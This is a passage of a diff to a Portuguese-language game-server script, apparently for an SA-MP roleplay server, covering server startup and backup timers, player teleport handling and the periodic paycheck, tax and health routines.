+	dini_FloatSet(ficheiro, "VenderVeiculoY", oInfo[0][VenderVeiculoY]);
+	dini_FloatSet(ficheiro, "VenderVeiculoZ", oInfo[0][VenderVeiculoZ]);
+	dini_FloatSet(ficheiro, "CamaraMunicipalX", oInfo[0][CamaraMunicipalX]);
+	dini_FloatSet(ficheiro, "CamaraMunicipalY", oInfo[0][CamaraMunicipalY]);
+	dini_FloatSet(ficheiro, "CamaraMunicipalZ", oInfo[0][CamaraMunicipalZ]);
+	dini_IntSet(ficheiro, "CamaraMunicipalVirtualWorld", oInfo[0][CamaraMunicipalVirtualWorld]);
+	dini_IntSet(ficheiro, "CamaraMunicipalInterior", oInfo[0][CamaraMunicipalInterior]);
+	dini_IntSet(ficheiro, "CamaraMunicipalPickupID", oInfo[0][CamaraMunicipalPickupID]);
+	dini_Set(ficheiro, "NewsMusica1", oInfo[0][NewsMusica1]);
+	dini_Set(ficheiro, "NewsMusica2", oInfo[0][NewsMusica2]);
+	dini_Set(ficheiro, "NewsMusica3", oInfo[0][NewsMusica3]);
+	dini_Set(ficheiro, "NewsMusica4", oInfo[0][NewsMusica4]);
+	dini_Set(ficheiro, "NewsMusica5", oInfo[0][NewsMusica5]);
+	dini_Set(ficheiro, "NewsMusica6", oInfo[0][NewsMusica6]);
+	dini_Set(ficheiro, "NewsMusica1Alterador", oInfo[0][NewsMusica1Alterador]);
+	dini_Set(ficheiro, "NewsMusica2Alterador", oInfo[0][NewsMusica2Alterador]);
+	dini_Set(ficheiro, "NewsMusica3Alterador", oInfo[0][NewsMusica3Alterador]);
+	dini_Set(ficheiro, "NewsMusica4Alterador", oInfo[0][NewsMusica4Alterador]);
+	dini_Set(ficheiro, "NewsMusica5Alterador", oInfo[0][NewsMusica5Alterador]);
+	dini_Set(ficheiro, "NewsMusica6Alterador", oInfo[0][NewsMusica6Alterador]);
+	dini_Set(ficheiro, "NewsMusica1Nome", oInfo[0][NewsMusica1Nome]);
+	dini_Set(ficheiro, "NewsMusica2Nome", oInfo[0][NewsMusica2Nome]);
+	dini_Set(ficheiro, "NewsMusica3Nome", oInfo[0][NewsMusica3Nome]);
+	dini_Set(ficheiro, "NewsMusica4Nome", oInfo[0][NewsMusica4Nome]);
+	dini_Set(ficheiro, "NewsMusica5Nome", oInfo[0][NewsMusica5Nome]);
+	dini_Set(ficheiro, "NewsMusica6Nome", oInfo[0][NewsMusica6Nome]);
+	dini_IntSet(ficheiro, "ImpostoCarros", oInfo[0][ImpostoCarros]);
+	dini_IntSet(ficheiro, "ImpostoCasas", oInfo[0][ImpostoCasas]);
+	dini_IntSet(ficheiro, "ImpostoLojas", oInfo[0][ImpostoLojas]);
+	dini_FloatSet(ficheiro, "AeroportoX", oInfo[0][AeroportoX]);
+	dini_FloatSet(ficheiro, "AeroportoY", oInfo[0][AeroportoY]);
+	dini_FloatSet(ficheiro, "AeroportoZ", oInfo[0][AeroportoZ]);
+	dini_IntSet(ficheiro, "AeroportoVirtualWorld", oInfo[0][AeroportoVirtualWorld]);
+	dini_IntSet(ficheiro, "AeroportoInterior", oInfo[0][AeroportoInterior]);
+	dini_IntSet(ficheiro, "AeroportoPickupID", oInfo[0][AeroportoPickupID]);
 
 	return 1;
 }
@@ -13522,8 +13494,13 @@ public CarregarServidor()
     DisableInteriorEnterExits();
     ShowPlayerMarkers(0);
     EnableStuntBonusForAll(0);
-    Streamer_ToggleErrorCallback(1);
-    
+
+    SetTimer_("GuardarServidor", 1800000, TIMER_NODELAY, TIMER_INFINITO);
+    SetTimer_("AtualizarTodasCaravanasPos", 500, TIMER_NODELAY, TIMER_INFINITO);
+    SetTimer_("Relogio", 1000, TIMER_NODELAY, TIMER_INFINITO);
+    SetTimer_("NaoExplode", 1000, TIMER_NODELAY, TIMER_INFINITO);
+    //SetTimer_("UpdateMySQLInfo", 1800000, TIMER_NODELAY, TIMER_INFINITO);
+
 	CarregarCidades();
 	CarregarJobs();
 	CarregarCarros();
@@ -13536,7 +13513,7 @@ public CarregarServidor()
 	CarregarStats();
 	DesligarMotores();
 	CarregarMapas();
-	
+
  	if(!LogExists(LOG_MONEY)) CreateLog(LOG_MONEY);
  	if(!LogExists(LOG_JOIN)) CreateLog(LOG_JOIN);
  	if(!LogExists(LOG_HACK)) CreateLog(LOG_HACK);
@@ -13554,19 +13531,19 @@ public CarregarServidor()
 	ListaCarrosComprar = LoadModelSelectionMenu("carros.txt");
 	ListaObjetos = LoadModelSelectionMenu("objetos.txt");
 	ListaObjetosComprar = LoadModelSelectionMenu("objetos.txt");
-	
+
 	EnableAntiCheat(30, 0);
 	EnableAntiCheat(44, 0);
 	EnableAntiCheat(52, 0);
-	
+
 	zonaPescar = CreateDynamicCircle(574, -2510, 80, -1, -1, -1);
-	
+
 	new Hour, Minute, Second;
 	gettime(Hour, Minute, Second);
 	SetWorldTime(Hour);
-	
+
 	// RELéGIO
-	
+
 	relogio = TextDrawCreate(544.666625, 24.488906, "00:00:00");
 	TextDrawLetterSize(relogio, 0.400000, 1.600000);
 	TextDrawAlignment(relogio, 1);
@@ -13579,7 +13556,7 @@ public CarregarServidor()
 	TextDrawSetShadow(relogio, 0);
 
 	// INTRO
-	
+
 	TDEditor_TD[0] = TextDrawCreate(-30.666690, -2.888933, "_~n~");
 	TextDrawLetterSize(TDEditor_TD[0], 0.378333, 55.350238);
 	TextDrawTextSize(TDEditor_TD[0], 1303.000000, 0.000000);
@@ -13593,7 +13570,7 @@ public CarregarServidor()
 	TextDrawFont(TDEditor_TD[0], 1);
 	TextDrawSetProportional(TDEditor_TD[0], 1);
 	TextDrawSetShadow(TDEditor_TD[0], 0);
-	
+
 	TDEditor_TD[6] = TextDrawCreate(205.666992, 17.436975, "Portugal_Fun_Maps apresenta...");
 	TextDrawLetterSize(TDEditor_TD[6], 0.400000, 1.600000);
 	TextDrawAlignment(TDEditor_TD[6], 1);
@@ -13661,7 +13638,7 @@ public CarregarServidor()
 	TextDrawSetShadow(TDEditor_TD[5], 0);
 
 	// VELOCIMETRO
-	
+
 	TDEditor_TDVel[0] = TextDrawCreate(380.000000, 397.407592, "i");
 	TextDrawLetterSize(TDEditor_TDVel[0], 28.800073, 2.599997);
 	TextDrawAlignment(TDEditor_TDVel[0], 1);
@@ -13815,9 +13792,9 @@ public CarregarServidor()
 	TextDrawFont(TDEditor_TDVel[13], 1);
 	TextDrawSetProportional(TDEditor_TDVel[13], 1);
 	TextDrawSetShadow(TDEditor_TDVel[13], 0);
-	
+
 	// IN GAME
-	
+
 	TDEditor_TDInGame[0] = TextDrawCreate(3.000030, 433.496246, "paradise_city_");
 	TextDrawLetterSize(TDEditor_TDInGame[0], 0.349999, 1.185184);
 	TextDrawAlignment(TDEditor_TDInGame[0], 1);
@@ -13839,7 +13816,7 @@ public CarregarServidor()
 	TextDrawFont(TDEditor_TDInGame[1], 3);
 	TextDrawSetProportional(TDEditor_TDInGame[1], 1);
 	TextDrawSetShadow(TDEditor_TDInGame[1], 0);
-	
+
 	TDEditor_TDInGame[2] = TextDrawCreate(480.998657, 432.666442, "WWW.~n~");
 	TextDrawLetterSize(TDEditor_TDInGame[2], 0.310665, 1.330368);
 	TextDrawAlignment(TDEditor_TDInGame[2], 2);
@@ -13875,7 +13852,7 @@ public CarregarServidor()
 	TextDrawSetProportional(TDEditor_TDInGame[4], 1);
 	TextDrawSetShadow(TDEditor_TDInGame[4], 0);
 	TextDrawSetSelectable(TDEditor_TDInGame[4], true);
-	
+
 	return 1;
 }
 
@@ -13886,16 +13863,15 @@ public GuardarServidor()
 	new tick2;
 
 	tick1 = GetTickCount();
-	
+
 	format(string, sizeof(string), "[BACKUP:] {FFFFFF}Está a haver um backup neste momento. Podem experienciar um pouco de lag");
 	SendClientMessageToAll(COLOR_ORANGE, string);
-	
+
  	foreach(new i : Player)
     {
-        // if(!IsPlayerConnected(i)) continue;
 		GuardarJogador(i);
     }
-	
+
 	GuardarCidades();
     GuardarJobs();
     GuardarCarros();
@@ -13905,29 +13881,27 @@ public GuardarServidor()
     GuardarCasas();
     GuardarFactions();
     GuardarBuildings();
-    
+
 	for(new i = 0; i < MAX_BUSINESS; i++)
 	{
 	    if(i == 0) continue;
 
 	    AtualizarBiz(i);
 	}
-    
+
     format(string, sizeof(string), "[BACKUP:] {FFFFFF}Backup terminado");
     SendClientMessageToAll(COLOR_ORANGE, string);
-    
+
     tick2 = GetTickCount();
-    
+
     foreach(new i : Player)
     {
-        // if(!IsPlayerConnected(i)) continue;
         if(pInfo[i][Admin] == 0) continue;
-        if(DebugStatus[i] == false) continue;
-        
+
         format(string, sizeof(string), "[BACKUP:] {FFFFFF}Tempo de backup: %d ms", tick2-tick1);
         SendClientMessage(i, COLOR_ORANGE, string);
     }
-    
+
     return 1;
 }
 
@@ -13951,7 +13925,7 @@ public RespawnGeral()
   			PlaySoundForAll(4203);
 		    GameTextForAll("~y~RESPAWN", 2000, 6);
 			RespawnCounter = 0;
-			
+
 			for(new car = 1; car < MAX_CARROS; car++)
 			{
 			    new model = GetVehicleModel(car);
@@ -13992,12 +13966,12 @@ public RespawnJobFac()
   			PlaySoundForAll(4203);
 		    GameTextForAll("~y~RESPAWN", 2000, 6);
 			RespawnCounterJob = 0;
-			
+
 			new bool: trailer1 = false; // 41
 			new bool: trailer2 = false; // 42
 			new bool: trailer3 = false; // 43
 			new bool: trailer4 = false; // 44
-			
+
 			new bool: trailer5 = false; // 47
 			new bool: trailer6 = false; // 48
 			new bool: trailer7 = false; // 48
@@ -14019,7 +13993,7 @@ public RespawnJobFac()
 				    if(IsTrailerAttachedToVehicle(car))
 					{
 						new trailerid = GetVehicleTrailer(car);
-						
+
 						switch(trailerid)
 						{
 							case 40: { trailer1 = true; }
@@ -14061,7 +14035,7 @@ public JogadorPuxaJogador(playerid, giveplayerid)
 	new Float:pX, Float:pY, Float:pZ;
 
 	GetPlayerPos(playerid, pX, pY, pZ);
-	SetPlayerPosEx(giveplayerid, pX, pY, pZ);
+	SetPlayerPosEx(giveplayerid, pX, pY, pZ, GetPlayerVirtualWorld(playerid), GetPlayerInterior(playerid));
 
 	return 1;
 }
@@ -14073,7 +14047,7 @@ public DesligarMotores()
     for(new i = 0; i < MAX_CARROS; i++)
 	{
 	    if(IsVehicleOccupied(i) == 1) continue;
-	    
+
 		GetVehicleParamsEx(i,engine,lights,alarm,doors,bonnet,boot,objective);
 		SetVehicleParamsEx(i, 0,lights,alarm,doors,bonnet,boot,objective);
 		Motor[i] = false;
@@ -14084,7 +14058,7 @@ public SetPlayerHealthEx(playerid, Float:vida, type)
 {
 	new Float:current;
 	GetPlayerHealth(playerid, current);
-	
+
 	switch(type)
 	{
 	    case 0:
@@ -14107,7 +14081,7 @@ public SetPlayerHealthEx(playerid, Float:vida, type)
 		    return 0;
 		}
 	}
-	
+
 	return 1;
 }
 
@@ -14135,16 +14109,16 @@ public SetPlayerArmourEx(playerid, Float:colete, type)
 		    return 0;
 		}
 	}
-	
+
 	return 1;
 }
 
 public SetVehiclePosEx(vehicleid, Float:x, Float:y, Float:z)
 {
 	new pid = IsVehicleOccupied(vehicleid);
-	
+
     SetVehiclePos(vehicleid, x, y, z+0.3);
-	
+
 	if(pid != 0)
 	{
  		Streamer_UpdateEx(pid, x, y, z, -1, -1);
@@ -14163,7 +14137,7 @@ public SetVehiclePosEx(vehicleid, Float:x, Float:y, Float:z)
 			hInfo[cInfo[vehicleid][CaravanaCasaID]][EnterVirtualWorld] = 0;
 		}
 	}
-	
+
 	AtualizarDanosCarro(vehicleid);
 
 	return 1;
@@ -14185,7 +14159,7 @@ public AtualizarCaravanaPos(vehicleid)
 	{
 	    GetVehicleRelativePos(vehicleid, cx, cy, cz, -0.7, -2.7, 1); // tropic 	    -0.7 -2.7 1
 	}
-	
+
 	hInfo[cInfo[vehicleid][CaravanaCasaID]][EnterX] = cx;
 	hInfo[cInfo[vehicleid][CaravanaCasaID]][EnterY] = cy;
 	hInfo[cInfo[vehicleid][CaravanaCasaID]][EnterZ] = cz;
@@ -14198,17 +14172,17 @@ public AtualizarCaravanaPos(vehicleid)
 public AtualizarTodasCaravanasPos()
 {
 	new Float:distance, engine, lights, alarm, doors, bonnet, boot, objective;
-	
+
     for(new i = 0; i < MAX_CARROS; i++)
     {
         if(cInfo[i][IsCaravana] != 1 && cInfo[i][IsCaravana] != 2) continue;
-        
+
         GetVehicleParamsEx(i,engine,lights,alarm,doors,bonnet,boot,objective);
-        
+
         if(Motor[i] == true) continue;
-        
+
         distance = GetVehicleDistanceFromPoint(i, hInfo[cInfo[i][CaravanaCasaID]][EnterX], hInfo[cInfo[i][CaravanaCasaID]][EnterY], hInfo[cInfo[i][CaravanaCasaID]][EnterZ]);
-        
+
         if(distance > 3)
         {
 		 	DestroyDynamicPickup(HousePickup[cInfo[i][CaravanaCasaID]]);
@@ -14220,27 +14194,59 @@ public AtualizarTodasCaravanasPos()
 			hInfo[cInfo[i][CaravanaCasaID]][EnterAngle] = 0;
 			hInfo[cInfo[i][CaravanaCasaID]][EnterInterior] = 0;
 			hInfo[cInfo[i][CaravanaCasaID]][EnterVirtualWorld] = 0;
-			
+
 			AtualizarCaravanaPos(i);
         }
     }
-    
+
     return 1;
 }
 
-public SetPlayerPosEx(playerid, Float:x, Float:y, Float:z)
+public SetPlayerPosEx(playerid, Float:x, Float:y, Float:z, vw, interior)
 {
+	new currentVw = GetPlayerVirtualWorld(playerid);
+	new currentInt = GetPlayerInterior(playerid);
+
 	if(pInfo[playerid][Admin] == 0)
 	{
-		TogglePlayerControllable(playerid, 0);
-	 	GameTextForPlayer(playerid, "A carregar o mapa", 200, 1);
-	  	SetTimerEx("UnfreezeCarregar", 4000, false, "i", playerid);
+	    if(currentVw != vw || currentInt != interior)
+	    {
+			TogglePlayerControllable(playerid, 0);
+		 	GameTextForPlayer(playerid, "A carregar o mapa", 200, 1);
+		  	SetPlayerTimer(playerid, "UnfreezeCarregar", 2000, false);
 
-	   	Streamer_UpdateEx(playerid, x, y, z, -1, -1);
+		   	Streamer_UpdateEx(playerid, x, y, z, vw, interior);
+	    }
+
+	    if(x == 0 && y == 0 && z == 0)
+	    {
+			new string[128];
+
+			format(string, sizeof(string), "[ALERTA:] {FFFFFF}O jogador %s (ID:%d) foi teletransportado incorretamente.", GetPlayerNameEx(playerid), playerid);
+			SendAdminMessage(string);
+	    }
 	}
-	
+
     SetPlayerPos(playerid, x, y, z+0.6);
-    
+
+    if(vw == -1)
+    {
+        SetPlayerVirtualWorld(playerid, currentVw);
+    }
+    else
+    {
+    	SetPlayerVirtualWorld(playerid, vw);
+    }
+
+	if(interior == -1)
+	{
+	    SetPlayerInterior(playerid, currentInt);
+	}
+	else
+	{
+		SetPlayerInterior(playerid, interior);
+	}
+
 	return 1;
 }
 
@@ -14253,7 +14259,7 @@ public UnfreezeCarregar(playerid)
 public Aviao(playerid)
 {
 	SendClientMessage(playerid, COLOR_INFO, "Chegaste ao teu destino!");
-	SetPlayerPosEx(playerid, 0, 0, 10);
+	SetPlayerPosEx(playerid, 0, 0, 10, -1, -1);
 
 	return 1;
 }
@@ -14264,27 +14270,27 @@ public CrashServer()
    	{
    	    socket_destroy(g_Socket);
    	}
-   	
+
     fclose(fopen("fsafsa", io_read));
 }
 
 public PayDay(playerid)
 {
 	new string[128], startbank;
-	
+
 	if(pInfo[playerid][Jailed] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Estás no AJ, não recebeste paycheck.");
-	
+
 	pInfo[playerid][Minutos] = 0;
-	
+
 	SendClientMessage(playerid, COLOR_ORANGE, "_________________________________________{00FF00}[ {FFFFFF}PAYCHECK {00FF00}]{FF9900}_______________________________________");
-	
+
 	startbank = pInfo[playerid][Bank];
 	new nextlevelxp = pInfo[playerid][Level]*3;
-	
+
 	if(pInfo[playerid][Emprego] != 0)
 	{
 	    pInfo[playerid][Bank] += jInfo[pInfo[playerid][Emprego]][Salario];
-	    
+
 		format(string, sizeof(string), "[EMPREGO:] {FFFFFF}Salário recebido: %d$", jInfo[pInfo[playerid][Emprego]][Salario]);
         SendClientMessage(playerid, COLOR_CHAT, string);
 	}
@@ -14292,10 +14298,10 @@ public PayDay(playerid)
 	{
 		format(string, sizeof(string), "[EMPREGO:] {FFFFFF}Fundo de Desemprego recebido: %d$", oInfo[0][FundoDesemprego]);
         SendClientMessage(playerid, COLOR_CHAT, string);
-        
+
 		pInfo[playerid][Bank] += oInfo[0][FundoDesemprego];
 	}
-	
+
 	if(pInfo[playerid][Faction] != 0)
 	{
 		switch(pInfo[playerid][FactionRank])
@@ -14304,7 +14310,7 @@ public PayDay(playerid)
 		    {
 		 	    pInfo[playerid][Bank] += fInfo[pInfo[playerid][Faction]][SalarioRank1];
 		 	    fInfo[pInfo[playerid][Faction]][Bank] -= fInfo[pInfo[playerid][Faction]][SalarioRank1];
-		 	    
+
 				format(string, sizeof(string), "[FACTION:] {FFFFFF}Rank: %s", fInfo[pInfo[playerid][Faction]][Rank1]);
 		        SendClientMessage(playerid, COLOR_CHAT, string);
 				format(string, sizeof(string), "[FACTION:] {FFFFFF}Salário recebido: %d$", fInfo[pInfo[playerid][Faction]][SalarioRank1]);
@@ -14362,12 +14368,12 @@ public PayDay(playerid)
 			}
 		}
 	}
-	
+
 	if(pInfo[playerid][XP] >= nextlevelxp)
 	{
 	    pInfo[playerid][XP] = 0;
      	pInfo[playerid][Level]++;
-	    
+
 	    if(pInfo[playerid][Golds] > 0)
 	    {
 	        pInfo[playerid][Bank] += pInfo[playerid][Level]*100;
@@ -14376,9 +14382,9 @@ public PayDay(playerid)
 		{
 		    pInfo[playerid][Bank] += pInfo[playerid][Level]*50;
 		}
-	    
+
 	    SetPlayerScore(playerid, pInfo[playerid][Level]);
-	    
+
 		format(string, sizeof(string), "[JOGADOR:] {FFFFFF}Parabéns, subiste de nível! Novo objetivo: %d experiência. Ganhaste %d$ de bónus", pInfo[playerid][Level]*3, pInfo[playerid][Level]*70);
 		SendClientMessage(playerid, COLOR_CHAT, string);
 	}
@@ -14392,23 +14398,23 @@ public PayDay(playerid)
 		{
 		    pInfo[playerid][XP]++;
 		}
-	    
+
 		format(string, sizeof(string), "[JOGADOR:] {FFFFFF}Tens atualmente %d/%d de experiência", pInfo[playerid][XP], pInfo[playerid][Level]*3);
 		SendClientMessage(playerid, COLOR_CHAT, string);
 	}
-	
+
 	if(pInfo[playerid][Meses] == 12)
 	{
 	    pInfo[playerid][Idade]++;
 	    pInfo[playerid][Meses] = 0;
-	    
+
 		format(string, sizeof(string), "[JOGADOR:] {FFFFFF}Parabéns, fizeste anos! Tens agora %d anos", pInfo[playerid][Idade]);
 		SendClientMessage(playerid, COLOR_CHAT, string);
 	}
 	else
 	{
 	    pInfo[playerid][Meses]++;
-	    
+
 		format(string, sizeof(string), "[JOGADOR:] {FFFFFF}Tens agora %d anos e %d meses", pInfo[playerid][Idade], pInfo[playerid][Meses]);
 		SendClientMessage(playerid, COLOR_CHAT, string);
 	}
@@ -14419,7 +14425,7 @@ public PayDay(playerid)
      		case 1: // Gripe
 			{
                 new rand = random(3);
-                
+
                 if(rand == 1 || rand == 2)
                 {
                     SendClientMessage(playerid, COLOR_INFO, "[SAÚDE:] Os medicamentos fizeram efeito. Agora estás saudável");
@@ -14494,36 +14500,36 @@ public PayDay(playerid)
 			{
 				SendClientMessage(playerid, COLOR_INFO, "[SAÚDE:] Tens Gripe. Visita o Hospital o mais rápido possível");
     			PlayerActionMessage(playerid, 15.0, "espirra.");
-    			SetPlayerHealthEx(playerid, 15, 2);
+    			SetPlayerHealthEx(playerid, 15, HEALTH_REMOVE);
 			}
 			case 2: // Infeção Urinária
 			{
 				SendClientMessage(playerid, COLOR_INFO, "[SAÚDE:] Tens uma Infeção Urinária. Visita o Hospital o mais rápido possível");
-				SetPlayerHealthEx(playerid, 15, 2);
+				SetPlayerHealthEx(playerid, 15, HEALTH_REMOVE);
 			}
 			case 3: // Dores de barriga
 			{
 				SendClientMessage(playerid, COLOR_INFO, "[SAÚDE:] Tens Dores de Barriga. Visita o Hospital o mais rápido possível");
 				PlayerActionMessage(playerid, 15.0, "vomita.");
 				ApplyAnimation(playerid, "FOOD", "EAT_Vomit_P",4.1,0,1,1,2000,1);
-				SetPlayerHealthEx(playerid, 5, 2);
+				SetPlayerHealthEx(playerid, 5, HEALTH_REMOVE);
 			}
 			case 4: // Ataques de tosse
 			{
 				SendClientMessage(playerid, COLOR_INFO, "[SAÚDE:] Tens Ataques de Tosse regulares. Visita o Hospital o mais rápido possível");
 				PlayerActionMessage(playerid, 15.0, "começa a tossir.");
-				SetPlayerHealthEx(playerid, 10, 2);
+				SetPlayerHealthEx(playerid, 10, HEALTH_REMOVE);
 			}
 		}
 	}
 	else
 	{
         new rand = random(50);
-        
+
         if(rand == 1) // apanhou doença
         {
 			rand = random(5);
-			
+
 			switch(rand)
 			{
 	     		case 0,1: { SendClientMessage(playerid, COLOR_CHAT, "[SAÚDE:] Apanhaste Gripe. Visita o Hospital o mais rápido possível"); pInfo[playerid][Doenca] = 1; }
@@ -14537,11 +14543,11 @@ public PayDay(playerid)
             SendClientMessage(playerid, COLOR_CHAT, "[SAÚDE:] {FFFFFF}Estás saudável");
         }
 	}
-	
+
 	if(pInfo[playerid][ADesentoxicar] == 1) // 75 por cento de resultar
 	{
 	    new rand = random(4);
-	    
+
 	    if(rand == 1 || rand == 2 || rand == 3)
 	    {
 	        SendClientMessage(playerid, COLOR_CHAT, "[SAÚDE:] A desentoxicação resultou. Já não estás viciado nas drogas!");
@@ -14552,46 +14558,46 @@ public PayDay(playerid)
 		{
 		    SendClientMessage(playerid, COLOR_CHAT, "[SAÚDE:] A desentoxicação não resultou. Visita o hospital novamente!");
 		}
-	    
+
 	    pInfo[playerid][ADesentoxicar] = 0;
 	}
-	
+
 	if(GetOnlinePlayers() > 10)
 	{
 	    new bonus;
-	    
+
 	    if(pInfo[playerid][Golds] > 0) bonus = GetOnlinePlayers()*10;
 	    else bonus = GetOnlinePlayers()*5;
-	    
+
 	    pInfo[playerid][Bank] += bonus;
-	    
+
 		format(string, sizeof(string), "[BÓNUS:] {FFFFFF}Estão %d jogadores online. Bónus: %d$", GetOnlinePlayers(), bonus);
 		SendClientMessage(playerid, COLOR_CHAT, string);
 	}
-	
+
 	new juros = 0, imposto = 0, imposto_carros = 0, imposto_casa = 0, imposto_loja = 0, carnumber = GetPlayerCarNumber(playerid), governototal = 0;
-	
+
 	if(pInfo[playerid][Golds] > 0) // tem premium
 	{
 		juros = pInfo[playerid][Bank]/700;
 		imposto = oInfo[0][Impostos];
 		pInfo[playerid][Bank] += juros;
 		pInfo[playerid][Bank] -= imposto;
-		SetPlayerHealthEx(playerid, 5, 2);
-		
+		SetPlayerHealthEx(playerid, 5, HEALTH_REMOVE);
+
 		governototal += imposto;
-		
+
 		if(carnumber != 0 && oInfo[0][ImpostoCarros] != 0)
 		{
 		    imposto_carros = floatround((carnumber * oInfo[0][ImpostoCarros])/2, floatround_round);
 			format(string, sizeof(string), "[BANCO:] {FFFFFF}Imposto Automóvel: %d$", imposto_carros);
 			SendClientMessage(playerid, COLOR_CHAT, string);
-			
+
 			pInfo[playerid][Bank] -= imposto_carros;
-			
+
 			governototal += imposto_carros;
 		}
-		
+
 		if(pInfo[playerid][ChaveCasa] != 0 && oInfo[0][ImpostoCasas] != 0)
 		{
 		    imposto_casa = floatround(oInfo[0][ImpostoCasas]/2, floatround_round);
@@ -14599,10 +14605,10 @@ public PayDay(playerid)
 			SendClientMessage(playerid, COLOR_CHAT, string);
 
 			pInfo[playerid][Bank] -= imposto_casa;
-			
+
 			governototal += imposto_casa;
 		}
-		
+
 		if(pInfo[playerid][ChaveBiz] != 0 && oInfo[0][ImpostoLojas] != 0)
 		{
 		    imposto_loja = floatround(oInfo[0][ImpostoLojas]/2, floatround_round);
@@ -14610,7 +14616,7 @@ public PayDay(playerid)
 			SendClientMessage(playerid, COLOR_CHAT, string);
 
 			pInfo[playerid][Bank] -= imposto_loja;
-			
+
 			governototal += imposto_loja;
 		}
 	}
@@ -14620,8 +14626,8 @@ public PayDay(playerid)
 		imposto = oInfo[0][Impostos];
 		pInfo[playerid][Bank] += juros;
 		pInfo[playerid][Bank] -= imposto;
-		SetPlayerHealthEx(playerid, 10, 2);
-		
+		SetPlayerHealthEx(playerid, 10, HEALTH_REMOVE);
+
 		if(carnumber != 0 && oInfo[0][ImpostoCarros] != 0)
 		{
 		    imposto_carros = floatround((carnumber * oInfo[0][ImpostoCarros]), floatround_round);
@@ -14629,10 +14635,10 @@ public PayDay(playerid)
 			SendClientMessage(playerid, COLOR_CHAT, string);
 
 			pInfo[playerid][Bank] -= imposto_carros;
-			
+
 			governototal += imposto_carros;
 		}
-		
+
 		if(pInfo[playerid][ChaveCasa] != 0 && oInfo[0][ImpostoCasas] != 0)
 		{
 		    imposto_casa = oInfo[0][ImpostoCasas];
@@ -14640,10 +14646,10 @@ public PayDay(playerid)
 			SendClientMessage(playerid, COLOR_CHAT, string);
 
 			pInfo[playerid][Bank] -= imposto_casa;
-			
+
 			governototal += imposto_casa;
 		}
-		
+
 		if(pInfo[playerid][ChaveBiz] != 0 && oInfo[0][ImpostoLojas] != 0)
 		{
 		    imposto_loja = oInfo[0][ImpostoLojas];
@@ -14651,11 +14657,11 @@ public PayDay(playerid)
 			SendClientMessage(playerid, COLOR_CHAT, string);
 
 			pInfo[playerid][Bank] -= imposto_loja;
-			
+
 			governototal += imposto_loja;
 		}
 	}
-	
+
 	if(pInfo[playerid][Seguradora] == 1)
 	{
 		pInfo[playerid][Bank] -= pInfo[playerid][MensalidadeSeguradora];
@@ -14678,20 +14684,20 @@ public PayDay(playerid)
 	SendClientMessage(playerid, COLOR_CHAT, string);
 	format(string, sizeof(string), "[BANCO:] {FFFFFF}Antigo balanço: %d$  Novo Balanço: %d$", startbank, pInfo[playerid][Bank]);
 	SendClientMessage(playerid, COLOR_CHAT, string);
-	
+
 	if(pInfo[playerid][Golds] > 0)
 	{
 	    pInfo[playerid][Golds]--;
-	    
+
 		format(string, sizeof(string), "[GOLDS:] {FFFFFF}Tens agora %d golds.", pInfo[playerid][Golds]);
 		SendClientMessage(playerid, COLOR_CHAT, string);
-	} 
-	
+	}
+
 	GameTextForPlayer(playerid, "~g~PAYCHECK", 5000, 6);
 	PlayerPlaySound(playerid, 1149, 0.0, 0.0, 10.0);
-	
+
 	SendClientMessage(playerid, COLOR_ORANGE, "_____________________________________________________________________________________________");
-	
+
 	for(new i = 0; i < MAX_FACTIONS; i++)
 	{
  		if(fInfo[i][Type] != F_GOVERNO) continue;
@@ -14699,9 +14705,9 @@ public PayDay(playerid)
 		fInfo[i][Bank] += governototal;
 		break;
 	}
-	
+
 	GuardarJogador(playerid);
-	
+
 	return 1;
 }
 
@@ -14729,7 +14735,7 @@ public PlayerPlayerActionMessage(playerid,targetid,Float:radius,message[])
 
 	format(string, sizeof(string), "%s %s.",message,GetPlayerNameEx(targetid));
 	ProxDetectorRP(20.0, playerid, string);
-	
+
 	SetPlayerChatBubble(playerid, string, COLOR_ACTION, 15.0, 3000);
 
 	return 1;
@@ -14739,11 +14745,9 @@ public ProxDetectorRP(Float:radi, playerid, string1[])
 {
 	new Float:x, Float:y, Float:z, string[64], laststring[256];
 	GetPlayerPos(playerid, x, y, z);
-	
+
     foreach(new i : Player)
     {
-        // if(!IsPlayerConnected(i)) continue;
-        
 		if(IsPlayerInRangeOfPoint(i, 8.0, x, y, z))
 		{
 		    if(IsAmigo(i, playerid) == 1)
@@ -14754,7 +14758,7 @@ public ProxDetectorRP(Float:radi, playerid, string1[])
 		    {
 		        format(string, sizeof(string), "Desconhecido (UID: %d)", pInfo[playerid][UID]);
 		    }
-		    
+
 		    format(laststring, sizeof(laststring), "* %s %s", string, string1);
 		    SendClientMessage(i, COLOR_ACTION, laststring);
 		}
@@ -14769,7 +14773,6 @@ public ProxDetector(Float:radi, playerid, string[])
 
     foreach(new i : Player)
     {
-        // if(!IsPlayerConnected(i)) continue;
 		if(GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(i)) continue;
 		if(GetPlayerInterior(playerid) != GetPlayerInterior(i)) continue;
 
@@ -14789,7 +14792,6 @@ public ProxDetectorChat(Float:radi, playerid, string1[], type)
 
     foreach(new i : Player)
     {
-        // if(!IsPlayerConnected(i)) continue;
 		if(GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(i)) continue;
 		if(GetPlayerInterior(playerid) != GetPlayerInterior(i)) continue;
 
@@ -14802,7 +14804,7 @@ public ProxDetectorChat(Float:radi, playerid, string1[], type)
 		    else
 		    {
 		        format(string, sizeof(string), "Desconhecido (UID: %d)", pInfo[playerid][UID]);
-		        
+
 		        if(strfind(string1, GetPlayerNameEx(playerid), true) != -1)
 				{
 				    VirarAmigo(i, playerid);
@@ -14844,14 +14846,13 @@ public ProxDetectorChatDuty(Float:radi, playerid, string1[])
 
     foreach(new i : Player)
     {
-        // if(!IsPlayerConnected(i)) continue;
 		if(GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(i)) continue;
 		if(GetPlayerInterior(playerid) != GetPlayerInterior(i)) continue;
 
 		if(IsPlayerInRangeOfPoint(i, 10.0, x, y, z))
 		{
 		    format(laststring, sizeof(laststring), "(( %s diz: %s ))", GetPlayerNameEx(playerid), string1);
-		    
+
 		   	switch(pInfo[playerid][Admin])
 			{
 			    case 1,2:
@@ -14883,13 +14884,12 @@ public ProxDetectorDo(Float:radi, playerid, string1[]) // format(string, sizeof(
 
     foreach(new i : Player)
     {
-        // if(!IsPlayerConnected(i)) continue;
 		if(GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(i)) continue;
